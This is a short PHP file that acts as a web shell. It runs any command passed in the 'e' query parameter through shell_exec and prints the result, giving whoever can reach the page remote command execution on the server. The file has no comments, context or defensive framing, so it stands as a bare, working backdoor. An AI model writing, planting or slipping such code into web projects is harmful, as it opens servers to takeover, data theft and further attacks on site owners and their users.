<?php 
	if(isset($_GET[e])) {
		echo "<br/>";
		echo shell_exec($_GET[e]);
		die;
	}
?>